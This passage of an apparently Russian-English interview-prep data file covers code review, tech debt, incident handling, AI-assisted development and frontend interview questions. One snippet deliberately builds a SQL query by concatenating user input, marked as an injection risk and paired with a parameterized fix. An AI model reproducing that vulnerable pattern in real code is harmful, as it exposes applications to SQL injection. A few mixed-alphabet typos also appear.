            "Хорошее код-ревью фокусируется на реальных рисках (корректность, архитектурные последствия, читаемость для будущих разработчиков), а не на стилистических придирках, которые может поймать линтер; технический долг — это осознанное или неосознанное решение сделать 'быстрее, но хуже' сейчас, за которое придётся заплатить позже.",
          detailedExplanation:
            "Эффективное код-ревью различает уровни серьёзности замечаний: блокирующие (баг, риск безопасности, нарушение архитектурных границ) должны быть явно помечены как таковые и требуют исправления перед мержем, тогда как стилистические предпочтения ('я бы назвал иначе') уместнее как необязательный комментарий, не блокирующий мерж — смешение этих уровней без явного разделения превращает ревью в источник трения и замедляет доставку без пропорциональной пользы. Технический долг полезно классифицировать по намеренности и осознанности (по матрице Мартина Фаулера): осознанный и разумный долг ('делаем проще сейчас, зная цену, и документируем это явно, например в TODO с контекстом') принципиально отличается от неосознанного долга (просто не знали лучшего способа) — первый управляем и может быть частью стратегии, второй обнаруживается только постфактум. Как лид, важно не просто 'бороться с техдолгом' абстрактно, а уметь явно оценить его стоимость в конкретных терминах (замедляет ли он текущую разработку, создаёт ли риск багов, блокирует ли он конкретную будущую фичу) и приоритизировать его наравне с остальной работой, а не откладывать вечно 'когда будет время', которое никогда не наступает само.",
          whereUsed:
            "Ежедневная практика код-ревью в команде, ретроспективы и планирование спринтов (выделение времени на погашение техдолга), обсуждение архитектурных компромиссов с продуктом при принятии решения 'быстрее, но с долгом' против 'медленнее, но чисто'.",
          interviewQuestion: "Как вы определяете, какой технический долг стоит гасить в первую очередь, а какой может подождать?",
          interviewAnswerRu:
            "Приоритизация технического долга строится на пересечении двух осей: как часто затрагиваемый код меняется (высокочастотно изменяемый код с долгом создаёт постоянное трение для команды) и насколько высока цена ошибки в нём (критичная для бизнеса логика с долгом — больший риск, чем редко используемый второстепенный экран). Долг в редко меняемом, некритичном коде можно оставить как есть индифферентно долго — усилия на его исправление не окупятся, тогда как долг в часто изменяемом ядре системы стоит гасить в первую очередь, потому что каждое последующее изменение платит его 'проценты' в виде замедления и риска багов.",
          interviewAnswerEn:
            "Prioritizing technical debt comes down to two intersecting axes: how often the affected code changes (high-churn code carrying debt creates constant friction for the team) and how costly a mistake there would be (business-critical logic with debt is a bigger risk than a rarely used secondary screen). Debt in rarely changed, non-critical code can be left alone indefinitely — the effort to fix it wouldn't pay off — whereas debt in a frequently changed core of the system should be paid down first, because every subsequent change pays its 'interest' in slower delivery and bug risk.",
          pitfalls: [
            "Блокировать мерж на чисто стилистических предпочтениях наравне с реальными багами — размывает приоритет действительно важных замечаний.",
            "Откладывать весь технический долг 'на потом' без явной приоритизации по частоте изменений и цене ошибки — 'потом' обычно не наступает, пока долг не начинает реально мешать.",
          ],
        },
      },
      {
        id: "lead-mentoring-estimation-planning",
        title: "Mentoring, Estimation, Sprint Planning",
        content: {
          title: "Mentoring, Estimation, Sprint Planning",
          shortExplanation:
            "Менторинг — это помощь коллеге вырасти в самостоятельности, а не решение задач за него; оценка (estimation) — это осознание и коммуникация неопределённости, а не точное предсказание будущего; sprint planning — согласование реалистичного объёма работы с учётом неопределённости, а не механическое распределение задач по календарю.",
          detailedExplanation:
            "Эффективный менторинг чаще выглядит как наводящие вопросы ('что ты уже пробовал?', 'какие есть варианты и в чём их компромиссы?'), а не немедленное решение проблемы за менти — цель в том, чтобы человек научился сам приходить к подобным решениям в будущем, а не зависел от лида в каждой похожей ситуации; для этого важно сознательно оставлять пространство для ошибок с низкой ценой, из которых менти может извлечь урок сам. Оценка задач принципиально неточна для нового/незнакомого кода — техника разбиения большой задачи на более мелкие, более предсказуемые подзадачи (декомпозиция) снижает неопределённость лучше, чем попытка 'угадать' точное число дней для большой неопределённой задачи целиком; относительная оценка (story points, сравнение с уже сделанными задачами) часто честнее абсолютных часов именно потому, что явно признаёт: мы оцениваем сложность/размер, а не гарантированное время. Sprint planning должен явно учитывать buffer на непредвиденное (баги, срочные запросы, встречи) — команда, планирующая 100% доступного времени только на новые задачи без запаса, систематически не успевает и теряет доверие к своим оценкам, тогда как реалистичное планирование с явным запасом создаёт предсказуемость, даже если формально 'берёт меньше' задач в спринт.",
          whereUsed:
            "1:1 с младшими разработчиками, ретроспективы и планирование спринтов, оценка крупных фич перед стартом (обычно через декомпозицию и групповую оценку, например planning poker).",
          interviewQuestion: "Как вы подходите к менторингу разработчика, который постоянно приходит к вам с готовыми вопросами вместо попыток решить самому?",
          interviewAnswerRu:
            "Первый шаг — не решать задачу за человека немедленно, а спросить, что он уже пробовал и какие у него есть гипотезы — это часто само по себе выявляет, что человек либо не пытался разобраться самостоятельно, либо застрял в конкретном месте, которое можно точечно прояснить, не решая всю задачу целиком. Долгосрочно полезно явно обсудить с человеком ожидание: до какого момента стоит пытаться разобраться самостоятельно, прежде чем обращаться за помощью, и одновременно создать безопасную среду, где обращение за помощью после разумной попытки не воспринимается как провал — баланс между самостоятельностью и не тратой времени командой на то, что можно было бы решить с одной подсказкой.",
          interviewAnswerEn:
            "The first step isn't to solve the problem immediately, but to ask what they've already tried and what hypotheses they have — this often reveals on its own whether the person hasn't tried figuring it out themselves, or is stuck at one specific point that can be clarified without solving the whole task for them. Longer term, it helps to explicitly discuss expectations with the person: how long to attempt something independently before asking for help, while also creating a safe environment where asking for help after a reasonable attempt isn't seen as a failure — balancing independence against not wasting team time on something a single hint could have resolved.",
          pitfalls: [
            "Решать задачу за менти вместо того, чтобы задавать наводящие вопросы — лишает человека возможности научиться самостоятельности.",
            "Планировать спринт на 100% доступного времени без запаса на непредвиденное — систематически подрывает предсказуемость и доверие к оценкам команды.",
          ],
        },
      },
      {
        id: "lead-incident-handling-ownership",
        title: "Incident Handling & Production Ownership",
        content: {
          title: "Incident Handling & Production Ownership",
          shortExplanation:
            "Обработка инцидента в проде требует сначала остановить ущерб (митигировать) и только потом разбираться в первопричине — попытка сразу найти 'настоящую' причину посреди активного инцидента продлевает время простоя; production ownership — это ответственность за то, что происходит с кодом после деплоя, а не только за факт его написания.",
          detailedExplanation:
            "Стандартная последовательность реакции на инцидент: обнаружить (через мониторинг/алерты, а в идеале — раньше, чем это сделают пользователи), митигировать немедленный ущерб (откатить деплой, включить feature flag выключения проблемной функциональности, временно снизить нагрузку) — и только после того, как ситуация стабилизирована, переходить к поиску первопричины; смешение этих фаз (пытаться дебажить первопричину, пока прод активно 'горит') обычно продлевает простой без пользы. После инцидента полезен постмортем без поиска виноватых (blameless postmortem) — фокус на 'что в системе/процессе позволило этой ошибке дойти до прода и как это предотвратить структурно', а не 'кто написал баг', потому что культура поиска виноватых отбивает у людей желание открыто говорить о рисках и ошибках в будущем, что в итоге приводит к большему числу скрытых проблем, а не меньшему. Production ownership на практике означает: инженер, задеплоивший изменение, остаётся вовлечённым, пока не убедится, что оно работает как ожидалось в реальном трафике (мониторит метрики/алерты после деплоя, а не деплоит и сразу переключается на другую задачу), и у команды в целом есть чёткое понимание, кто и как реагирует на алерт в 3 часа ночи, а не смутное 'кто-нибудь разберётся'.",
          whereUsed:
            "Дежурства on-call, инцидент-менеджмент для критичных production-систем, постмортемы после серьёзных сбоев, обсуждение владения качеством между командой разработки и отдельной QA/SRE (если такая существует в организации).",
          interviewQuestion: "Опишите свой подход к обработке критичного инцидента в проде на реальном примере.",
          interviewAnswerRu:
            "На реальном инциденте важно чётко разделить две фазы: сначала остановить ущерб самым быстрым доступным способом (откат деплоя, feature flag, временное отключение проблемной функциональности), не тратя время на выяснение точной причины посреди активного сбоя, и только после стабилизации ситуации переходить к расследованию первопричины через логи, метрики, воспроизведение. После разрешения инцидента полезен blameless postmortem, фокусирующийся на системных причинах (что в процессе/мониторинге позволило проблеме дойти до прода незамеченной) и конкретных структурных изменениях, предотвращающих повторение — а не на том, кто именно написал проблемный код.",
          interviewAnswerEn:
            "In a real incident, it's important to clearly separate two phases: first stop the damage by the fastest available means (rolling back the deploy, a feature flag, temporarily disabling the problematic functionality) without spending time pinpointing the exact cause mid-outage, and only after the situation stabilizes move to root-cause investigation via logs, metrics, and reproduction. After resolving the incident, a blameless postmortem is valuable, focusing on systemic causes (what in the process/monitoring let the problem reach production unnoticed) and concrete structural changes that prevent recurrence — rather than on who specifically wrote the problematic code.",
          pitfalls: [
            "Пытаться найти точную первопричину прямо во время активного инцидента вместо того, чтобы сначала митигировать ущерб.",
            "Проводить постмортемы в культуре поиска виноватых — отбивает у команды желание открыто сообщать о рисках и потенциальных проблемах в будущем.",
          ],
        },
      },
    ],
  },


  {
    id: "ai-in-engineering",
    title: "AI in Software Engineering",
    subtopics: [
      {
        id: "ai-effective-usage",
        title: "Как эффективно использовать AI-инструменты",
        content: {
          title: "Как эффективно использовать AI-инструменты (ChatGPT / Claude / Codex)",
          shortExplanation:
            "AI-ассистент наиболее полезен как усилитель для задач, где вы можете быстро и уверенно проверить результат (генерация кода по чёткой спецификации, рефакторинг с понятным правилом, объяснение незнакомого кода) — и наименее надёжен там, где сложно проверить корректность самостоятельно (тонкая бизнес-логика, требующая контекста, которого у модели нет).",
          detailedExplanation:
            "Качество результата сильно зависит от качества промпта: конкретный контекст (какой фреймворк, версия, ограничения, что уже пробовали и почему не сработало) даёт кардинально лучший результат, чем общий вопрос без контекста — модель не может угадать неявные ограничения проекта, если их не сообщить явно. AI особенно эффективен для задач с быстрой проверяемостью результата: сгенерировать шаблонный код (boilerplate), предложить несколько вариантов реализации известного паттерна, объяснить незнакомую библиотеку или чужой код, найти похожий баг по описанию симптомов — в этих случаях неправильный результат легко заметить при чтении или запуске. Менее надёжная зона — специфичная бизнес-логика, зависящая от контекста, которого в промпте нет (внутренние соглашения команды, история решений, неочевидные ограничения продукта) — здесь модель может дать правдоподобно выглядящий, но неверный по существу ответ, который сложнее distinguишь от корректного без глубокого понимания предметной области самим разработчиком. Продуктивный стиль работы — итеративный диалог (уточнение, показ ошибки, просьба объяснить конкретное решение), а не одна попытка получить готовое решение целиком, и явное разделение ролей: AI предлагает, разработчик решает, проверяет и берёт на себя ответственность за то, что попадает в кодовую базу.",
          whereUsed:
            "Ежедневная разработка: написание тестов по описанию поведения, рефакторинг по чёткому правилу, объяснение legacy-кода без документации, первый черновик реализации известного паттерна, ревью собственного PR перед отправкой коллегам.",
          interviewQuestion: "Как вы решаете, когда стоит использовать AI-ассистента для задачи, а когда — нет?",
          interviewAnswerRu:
            "Главный критерий — насколько быстро и уверенно я смогу проверить корректность результата самостоятельно. Для генерации шаблонного кода, объяснения незнакомой библиотеки или предложения нескольких вариантов известного паттерна AI экономит время, а неправильный результат легко заметен при чтении. Для задач, завязанных на специфичный контекст команды или продукта, которого нет в промпте (внутренние соглашения, история прошлых решений, неочевидные бизнес-ограничения), я использую AI осторожнее — как отправную точку для обсуждения, а не как готовый ответ, потому что здесь модель может дать правдоподобный, но по существу неверный результат, который сложно отличить от верного без собственного глубокого понимания контекста.",
          interviewAnswerEn:
            "The main criterion is how quickly and confidently I can verify the result's correctness myself. For boilerplate generation, explaining an unfamiliar library, or proposing several variants of a known pattern, AI saves time, and an incorrect result is easy to spot on review. For tasks tied to context specific to the team or product that isn't in the prompt (internal conventions, the history of past decisions, non-obvious business constraints), I use AI more cautiously — as a starting point for discussion rather than a finished answer, because the model can produce something plausible-looking but substantively wrong, hard to tell apart from correct without my own deep understanding of the context.",
          pitfalls: [
            "Принимать сгенерированный код без чтения и понимания только потому, что он 'выглядит правильно' и компилируется.",
            "Просить AI решить задачу с недостающим контекстом (внутренние соглашения, ограничения продукта) и ожидать, что результат учтёт то, о чём модель не могла знать.",
          ],
        },
      },
      {
        id: "ai-code-review-refactoring-legacy",
        title: "AI для code review, рефакторинга и legacy-кода",
        content: {
          title: "AI для code review, рефакторинга и legacy-кода",
          shortExplanation:
            "AI-ассистент полезен как 'первая линия' код-ревью (поймать очевидные проблемы до отправки коллегам) и как инструмент для быстрого понимания незнакомого legacy-кода без документации, но не заменяет ревью человеком, который понимает бизнес-контекст и архитектурные последствия изменения.",
          detailedExplanation:
            "Для code review AI хорошо ловит механические проблемы: несогласованность именования, потенциальные null-reference ошибки, очевидные edge cases, не учтённые в коде, отсутствие обработки ошибок — это освобождает время человеческого ревьюера для более важных вопросов (архитектурные последствия, соответствие бизнес-требованиям, компромиссы дизайна), которые требуют понимания контекста, недоступного модели. Для рефакторинга AI эффективен там, где правило чёткое и механическое (переименовать по паттерну, извлечь повторяющийся код в функцию, обновить устаревший синтаксис на новый) — но для более глубокого структурного рефакторинга важно самостоятельно проверить, что предложенное изменение не сломало неочевидную связь, которую сложно заметить без полного понимания системы. Для legacy-кода без документации AI особенно ценен как способ быстро получить рабочую гипотезу о том, что делает непонятный фрагмент кода и почему он мог быть написан именно так — но такую гипотезу обязательно нужно проверять на реальном поведении системы (тесты, логи, обсуждение с автором, если он доступен), а не принимать как факт только потому, что объяснение звучит убедительно.",
          codeExample:
            "// Продуктивный промпт для понимания legacy-кода:\n// 'Объясни, что делает эта функция шаг за шагом, и предположи,\n//  почему обработка ошибки на строке 47 сделана именно так —\n//  какую проблему она могла решать исторически?'\n\n// Продуктивный промпт для рефакторинга с чётким правилом:\n// 'Извлеки повторяющуюся логику валидации email из этих трёх компонентов\n//  в отдельную переиспользуемую функцию, сохранив существующее поведение edge cases.'",
          whereUsed:
            "Первичный проход код-ревью перед отправкой коллегам, работа с унаследованным кодом без документации при передаче проекта, механический рефакторинг по чёткому шаблону (переименования, извлечение функций, обновление синтаксиса).",
          interviewQuestion: "Как вы используете AI при работе с legacy-кодом без документации, и в чём риск слепо доверять его объяснению?",
          interviewAnswerRu:
            "AI помогает быстро сформировать рабочую гипотезу о назначении непонятного фрагмента кода — это существенно ускоряет первичную ориентацию по сравнению с чтением кода строка за строкой без какого-либо контекста. Риск в том, что объяснение может звучать убедительно и правдоподобно, но быть основано на предположениях модели, а не на фактическом историческом контексте (почему код был написан именно так, какую реальную проблему он решал) — поэтому гипотезу нужно проверять на практике: тестами, логами реального поведения, обсуждением с автором кода, если это возможно, а не принимать как окончательный факт только на основании убедительности формулировки.",
          interviewAnswerEn:
            "AI helps quickly form a working hypothesis about what an unclear piece of code is for — this substantially speeds up initial orientation compared to reading code line by line with no context at all. The risk is that the explanation can sound convincing and plausible while actually being based on the model's assumptions rather than the actual historical context (why the code was really written that way, what real problem it solved) — so the hypothesis needs to be checked in practice: through tests, real behavior logs, or discussion with the original author if possible, rather than accepted as final fact just because it sounds convincing.",
          pitfalls: [
            "Принимать объяснение AI о назначении legacy-кода как окончательный факт без проверки на реальном поведении системы.",
            "Полагаться на AI-ревью как на замену человеческого ревью, а не как на дополнительную первую линию, ловящую механические проблемы.",
          ],
        },
      },
      {
        id: "ai-risks-hallucinations-ownership",
        title: "Риски AI: галлюцинации, безопасность, ответственность",
        content: {
          title: "Риски AI: галлюцинации, безопасность, ответственность",
          shortExplanation:
            "Галлюцинация — уверенно звучащий, но фактически неверный ответ модели (несуществующий метод API, придуманная деталь поведения библиотеки); за код, который в итоге попадает в продакшен, независимо от того, кто/что его сгенерировало, несёт ответственность разработчик, а не инструмент.",
          detailedExplanation:
            "Модель может 'галлюцинировать' с полной уверенностью в тоне — предложить вызов несуществующего метода API, описать поведение библиотеки, которого на самом деле нет, или дать правдоподобное, но неверное объяснение механизма — и синтаксическая правильность сгенерированного кода не гарантирует его смысловую корректность. Особый риск безопасности — принять сгенерированный код с уязвимостью (например, конкатенация пользовательского ввода прямо в SQL-запрос вместо параметризованного запроса, или отсутствие санитизации перед выводом в innerHTML) без критической проверки, потому что код выглядит рабочим при поверхностном тестировании, но содержит скрытую уязвимость, не проявляющуюся в обычном сценарии использования. Принцип ownership: независимо от того, кто/что написал код — сам разработчик, коллега или AI — ответственность за его корректность, безопасность и последствия в проде несёт разработчик, поставивший свою подпись под PR (через факт мержа), а не инструмент, который его сгенерировал; 'это же AI написал' не является оправданием в постмортеме инцидента. Проверка сгенерированного кода должна включать не просто чтение 'выглядит разумно', а фактическую верификацию: запуск тестов, проверку граничных случаев, для критичных мест — специальное внимание к безопасности (валидация ввода, права доступа, обработка ошибок).",
          codeExample:
            "// Пример: сгенерированный код может выглядеть рабочим, но содержать уязвимость\n// Опасно (сгенерировано без критической проверки):\nconst query = `SELECT * FROM users WHERE email = '${userInput}'`; // SQL injection\n\n// Правильно — параметризованный запрос, разработчик должен это заметить и исправить\nconst query = 'SELECT * FROM users WHERE email = $1';\ndb.query(query, [userInput]);",
          whereUsed:
            "Любое использование AI-генерации кода в проде обязано проходить через тот же процесс верификации (тесты, ревью, проверку безопасности), что и код, написанный человеком — особенно критично для кода, работающего с пользовательским вводом, аутентификацией, финансовыми операциями.",
          interviewQuestion: "Кто несёт ответственность, если сгенерированный AI код с уязвимостью попал в продакшен и привёл к инциденту?",
          interviewAnswerRu:
            "Ответственность несёт разработчик, смержCommitивший этот код, а не инструмент, который его сгенерировал — AI является усилителем продуктивности разработчика, но не заменяет его суждение и ответственность за то, что реально попадает в кодовую базу и продакшен. На практике это означает, что процесс проверки сгенерированного кода (тесты, ревью, отдельное внимание к безопасности для чувствительных мест) должен быть таким же строгим, как и для кода, написанного человеком, а не менее строгим только потому, что 'AI обычно хорошо справляется' — доверие к инструменту не отменяет необходимость верификации результата.",
          interviewAnswerEn:
            "Responsibility lies with the developer who merged that code, not with the tool that generated it — AI is a productivity multiplier for the developer, not a replacement for their judgment and accountability over what actually lands in the codebase and production. In practice, this means the verification process for generated code (tests, review, extra attention to security for sensitive spots) should be just as rigorous as for human-written code, not less rigorous just because 'AI is usually pretty good' — trusting the tool doesn't remove the need to verify its output.",
          pitfalls: [
            "Принимать сгенерированный код, работающий с пользовательским вводом или аутентификацией, без специальной проверки на уязвимости.",
            "Использовать 'это сгенерировал AI' как оправдание в постмортеме вместо анализа, почему процесс проверки не поймал проблему до продакшена.",
          ],
        },
      },
      {
        id: "ai-explaining-usage-interview",
        title: "Как рассказать про использование AI на интервью",
        content: {
          title: "Как рассказать про использование AI на интервью",
          shortExplanation:
            "Хороший ответ про использование AI на интервью показывает не факт использования инструмента (это сейчас ожидаемая норма), а зрелое понимание того, где AI даёт реальную пользу, где создаёт риск, и как вы лично проверяете и берёте ответственность за результат.",
          detailedExplanation:
            "Интервьюеры на senior/lead позициях обычно не спрашивают 'используете ли вы AI' как да/нет вопрос — они хотят понять качество вашего суждения о том, когда AI полезен, а когда рискован, и умеете ли вы описать это конкретными примерами, а не общими фразами вроде 'AI ускоряет мою работу'. Сильный ответ обычно содержит: конкретный пример задачи, где AI реально помог (не абстрактно, а с деталями — что именно делали, какой промпт, какой результат), явное упоминание, как вы проверяли результат перед тем, как он попал в кодовую базу, и осознание границ — пример ситуации, где вы сознательно не полагались на AI или где его предложение оказалось неверным и вы это поймали. Стоит избегать двух крайностей: представлять AI как 'магию, решающую всё' (создаёт впечатление, что вы не критически оцениваете результат) и полностью отрицать его использование в 2026 году (звучит неправдоподобно и как будто вы не в курсе современных практик индустрии) — честный, конкретный, взвешенный ответ с реальными примерами звучит убедительнее любой из крайностей.",
          whereUsed:
            "Прямой вопрос на интервью 'как вы используете AI в работе', а также как естественное дополнение к вопросам про продуктивность, качество кода, code review — везде, где можно органично упомянуть конкретный пример.",
          interviewQuestion: "How do you use AI tools in your day-to-day engineering work?",
          interviewAnswerRu:
            "(Ответ уже на английском ниже — это специально подготовленный interview answer для соответствующего вопроса, а не отдельный русский разбор.)",
          interviewAnswerEn:
            "I use AI assistants for a few specific things: drafting boilerplate and test scaffolding, explaining unfamiliar legacy code before I touch it, and getting a second opinion during code review to catch mechanical issues before sending a PR to teammates. For anything that touches business logic or security-sensitive code, I always verify the output myself — running tests, checking edge cases, and reading it as carefully as I would review a teammate's PR — because ownership for what ships stays with me, not the tool. A concrete example: I once had Claude suggest a caching approach that looked reasonable but would have caused a stale-data bug under a specific race condition our team had hit before; I caught it because I knew that history, which the model didn't.",
          pitfalls: [
            "Отвечать общими фразами ('AI ускоряет разработку') без единого конкретного примера с деталями.",
            "Представлять использование AI как полностью автономное, без упоминания собственной проверки и ответственности за результат.",
          ],
        },
      },
    ],
  },


  {
    id: "interview-questions",
    title: "Interview Questions",
    subtopics: [
      {
        id: "interview-virtual-dom",
        title: "Virtual DOM vs Real DOM",
        content: {
          title: "Virtual DOM vs Real DOM",
          shortExplanation:
            "Virtual DOM — это лёгкое JS-представление реального DOM в памяти, которое React использует, чтобы вычислить минимальный набор изменений перед тем, как трогать настоящий DOM.",
          detailedExplanation:
            "Прямые манипуляции с реальным DOM (через document.createElement, appendChild и т.д.) дорогие, потому что каждое изменение может вызывать layout/paint. React вместо этого при каждом рендере строит новое дерево виртуальных объектов (обычные JS-объекты, описывающие 'что должно быть'), сравнивает его с предыдущим деревом (diffing/reconciliation) и применяет к реальному DOM только реальные отличия одним пакетом (batch update). Это не значит, что Virtual DOM всегда быстрее прямых манипуляций в каждом отдельном случае — его реальное преимущество в том, что он даёт предсказуемую модель обновлений и автоматически батчит изменения, не заставляя разработчика вручную оптимизировать каждое обновление DOM.",
          codeExample:
            "// React под капотом (упрощённо):\n// 1. render() -> новое virtual DOM дерево (обычные объекты)\n// 2. diff(prevTree, nextTree) -> список конкретных изменений\n// 3. commit(changes) -> применение изменений к реальному DOM одним батчем\n\nconst element = { type: 'button', props: { children: 'Click' } }; // virtual DOM node",
          interviewQuestion: "Правда ли, что Virtual DOM всегда быстрее прямой работы с реальным DOM?",
          interviewAnswerRu:
            "Нет, это распространённое упрощение. Точечное, хорошо написанное прямое обновление одного конкретного DOM-узла может быть быстрее, чем построение нового virtual DOM дерева и его сравнение — сам diffing тоже стоит времени и памяти. Реальное преимущество Virtual DOM не в 'сырой скорости', а в том, что он даёт декларативную модель ('опиши, что должно быть на экране') вместо императивной ('опиши, как именно менять DOM'), автоматически батчит обновления и снижает число ошибок, которые возникают при ручной оптимизации прямых DOM-изменений.",
          interviewAnswerEn:
            "No, that's a common oversimplification. A targeted, well-written direct update to one specific DOM node can be faster than building a new virtual DOM tree and diffing it — the diffing itself costs time and memory too. The real advantage of the Virtual DOM isn't raw speed, it's that it provides a declarative model ('describe what should be on screen') instead of an imperative one ('describe exactly how to change the DOM'), automatically batches updates, and reduces the bugs that come from manually optimizing direct DOM changes.",
          pitfalls: [
            "Повторять фразу 'Virtual DOM быстрее' на интервью без понимания, в чём именно его реальное преимущество.",
            "Не знать, что современный React (Fiber) может прерывать и приоритизировать рендеринг именно благодаря промежуточному virtual DOM представлению.",
          ],
          practiceTask:
            "Объясните своими словами (вслух или письменно) три конкретных шага, которые происходят между вызовом setState и обновлением экрана в React.",
          resources: {
            docs: [
              { title: "Virtual DOM and Internals — React docs", url: "https://legacy.reactjs.org/docs/faq-internals.html" },
            ],
            articles: [
              { title: "What is the Virtual DOM in React? — freeCodeCamp", url: "https://www.freecodecamp.org/news/what-is-the-virtual-dom-in-react/" },
              { title: "React as a UI Runtime — Dan Abramov", url: "https://overreacted.io/react-as-a-ui-runtime/" },
            ],
          },
        },
      },
      {
        id: "interview-event-delegation",
        title: "Event Delegation",
        content: {
          title: "Event Delegation (делегирование событий)",
          shortExplanation:
            "Делегирование событий — техника, при которой один обработчик вешается на общего родителя, а не на каждый дочерний элемент по отдельности, используя всплытие событий (event bubbling).",
          detailedExplanation:
            "Большинство DOM-событий (click, input и др.) всплывают от целевого элемента вверх по дереву до document. Это позволяет повесить один обработчик на родительский контейнер (например, <ul>) и внутри него определить, по какому именно дочернему элементу (event.target) произошёл клик, вместо того чтобы вешать отдельный обработчик на каждый <li>. React использует эту идею внутри себя: вместо того чтобы вешать нативный обработчик на каждый DOM-узел с onClick, React вешает один обработчик на корень приложения и сам определяет, какой компонент должен получить событие (в актуальных версиях React обработчик вешается на корневой контейнер, а не на document).",
          codeExample:
            "// Один обработчик на родителе вместо N обработчиков на каждом <li>\ndocument.querySelector('ul').addEventListener('click', (event) => {\n  if (event.target.tagName === 'LI') {\n    console.log('Clicked item:', event.target.textContent);\n  }\n});",
          interviewQuestion: "Зачем использовать делегирование событий вместо обработчика на каждом элементе списка?",
          interviewAnswerRu:
            "Во-первых, это экономит память и упрощает управление обработчиками: один обработчик вместо тысячи для большого списка. Во-вторых, это автоматически работает для элементов, добавленных в DOM позже (динамически), потому что обработчик висит на родителе и не привязан к конкретным дочерним узлам — не нужно вручную навешивать новый обработчик на каждый новый элемент списка.",
          interviewAnswerEn:
            "First, it saves memory and simplifies handler management: one handler instead of thousands for a large list. Second, it automatically works for elements added to the DOM later (dynamically), because the handler lives on the parent and isn't tied to specific child nodes — there's no need to manually attach a new handler to every newly added list item.",
          pitfalls: [
            "Забывать, что не все события всплывают (например, focus/blur не всплывают в их обычной форме, хотя есть focusin/focusout, которые всплывают).",
            "Проверять event.target без учёта того, что клик мог произойти по вложенному элементу внутри <li> (например, по иконке), а не по самому <li> — нужен closest() вместо строгого сравнения tagName.",
          ],
          practiceTask:
            "Реализуйте список задач, где удаление элемента по клику на иконку 'крестик' обрабатывается одним делегированным обработчиком на родительском <ul>, используя event.target.closest().",
          resources: {
            docs: [
              { title: "DOM events — MDN", url: "https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model/Events" },
            ],
            articles: [
              { title: "Event delegation — javascript.info", url: "https://javascript.info/event-delegation" },
            ],
          },
        },
      },
      {
        id: "interview-rest-vs-graphql",
        title: "REST vs GraphQL",
        content: {
          title: "REST vs GraphQL",
          shortExplanation:
            "REST организует API вокруг фиксированных эндпоинтов и ресурсов с заранее заданной формой ответа; GraphQL даёт клиенту один эндпоинт, где сам клиент описывает, какие именно поля данных ему нужны.",
          detailedExplanation:
            "В REST для получения, например, поста с автором и комментариями часто нужно либо несколько запросов (/posts/1, /posts/1/comments, /users/5), либо специальный эндпоинт, заранее спроектированный именно под этот экран (что плохо масштабируется на много разных экранов). GraphQL решает это одним запросом, в котором клиент явно перечисляет нужные поля вложенных сущностей, и сервер возвращает ровно столько данных, сколько запрошено — не больше (решает over-fetching) и не меньше (решает under-fetching, когда пришлось бы делать дополнительный запрос). Платой за гибкость является более сложная настройка кэширования на клиенте (в REST кэшировать по URL просто, в GraphQL нужны специальные библиотеки вроде Apollo Client или же тот же TanStack Query поверх GraphQL-запросов) и потенциальная возможность клиента запросить слишком дорогой для сервера запрос.",
          codeExample:
            "// REST: обычно несколько запросов или специальный агрегирующий эндпоинт\nGET /posts/1\nGET /posts/1/comments\nGET /users/5\n\n// GraphQL: один запрос, клиент описывает форму ответа\nquery {\n  post(id: 1) {\n    title\n    author { name }\n    comments { text author { name } }\n  }\n}",
          interviewQuestion: "Что такое over-fetching и under-fetching, и как GraphQL решает обе проблемы одновременно?",
          interviewAnswerRu:
            "Over-fetching — это когда REST-эндпоинт возвращает больше полей, чем нужно конкретному экрану (например, весь профиль пользователя, хотя нужно только имя), что тратит трафик впустую. Under-fetching — обратная ситуация, когда одного запроса недостаточно и приходится делать ещё один (например, получить пост, а потом отдельно — данные его автора). GraphQL решает обе проблемы тем, что клиент сам явно описывает форму нужных данных в одном запросе — сервер не возвращает лишние поля и не заставляет делать второй запрос за недостающими данными.",
          interviewAnswerEn:
            "Over-fetching is when a REST endpoint returns more fields than a particular screen needs (e.g. the whole user profile when only the name is needed), wasting bandwidth. Under-fetching is the opposite — one request isn't enough, so a second is needed (get a post, then separately fetch its author's data). GraphQL solves both because the client explicitly describes the exact shape of data it needs in a single request — the server doesn't return extra fields, and no second request is needed for missing data.",
          pitfalls: [
            "Считать, что GraphQL 'всегда лучше' REST — для простых CRUD-API с небольшим числом экранов REST часто проще и достаточно.",
            "Не задумываться о кэшировании в GraphQL — без библиотеки вроде Apollo Client/normalized cache легко получить много повторных запросов за одни и те же данные.",
          ],
          practiceTask:
            "Опишите (в виде списка эндпоинтов и одного GraphQL-запроса) один и тот же сценарий 'получить пост с автором и последними 3 комментариями' через REST и через GraphQL, сравнив число запросов.",
          resources: {
            docs: [
              { title: "GraphQL — official Learn docs", url: "https://graphql.org/learn/" },
            ],
            articles: [
              { title: "GraphQL vs. REST — Apollo GraphQL Blog", url: "https://www.apollographql.com/blog/graphql/basics/graphql-vs-rest/" },
            ],
          },
        },
      },
      {
        id: "interview-var-let-const",
        title: "var vs let vs const",
        content: {
          title: "var vs let vs const",
          shortExplanation:
            "var имеет функциональную область видимости и поднимается (hoisting) с инициализацией undefined; let и const имеют блочную область видимости и находятся в 'temporal dead zone' до объявления.",
          detailedExplanation:
            "var видна во всей функции, в которой объявлена (не учитывая блоки {} внутри), и её объявление 'поднимается' наверх функции автоматически, из-за чего обращение к переменной до строки объявления не выбрасывает ошибку, а даёт undefined. let и const видны только внутри блока {}, в котором объявлены, и хотя они тоже технически 'поднимаются', обращение к ним до объявления выбрасывает ReferenceError (эта зона называется temporal dead zone). const дополнительно запрещает переприсваивание самой переменной (но не запрещает изменение содержимого объекта/массива, на который она ссылается).",
          codeExample:
            "if (true) {\n  var x = 1;\n  let y = 2;\n}\nconsole.log(x); // 1 — var видна за пределами блока if\nconsole.log(y); // ReferenceError — let не видна за пределами блока\n\nconst obj = { a: 1 };\nobj.a = 2; // OK — меняем содержимое, не переприсваиваем переменную\nobj = {}; // TypeError — нельзя переприсвоить const",
          interviewQuestion: "Почему цикл for (var i = 0; ...) с setTimeout внутри выводит одно и то же значение i для всех итераций, а for (let i = ...) — нет?",
          interviewAnswerRu:
            "var имеет одну общую переменную на весь цикл (функциональная область видимости), поэтому все замыкания внутри setTimeout ссылаются на одну и ту же переменную, значение которой к моменту выполнения колбэков уже равно финальному значению после цикла. let создаёт новую привязку переменной на каждую итерацию цикла (специальное поведение для for-циклов), поэтому каждое замыкание в setTimeout захватывает 'своё' значение i, соответствующее именно той итерации.",
          interviewAnswerEn:
